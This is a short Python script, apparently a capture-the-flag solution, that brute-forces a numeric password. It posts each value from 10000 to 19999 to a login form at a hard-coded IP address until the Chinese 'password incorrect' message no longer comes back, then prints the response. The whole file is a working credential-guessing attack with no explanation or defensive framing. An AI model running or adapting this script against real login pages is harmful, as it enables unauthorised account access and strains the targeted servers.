import requests

for i in range(10000, 20000):
    r = requests.post('http://120.24.86.145:8002//baopo/?yes', data={'pwd': i})
    if '密码不正确' in r.content.decode():
        print(i)
    else:
        print(r.content.decode())
        break
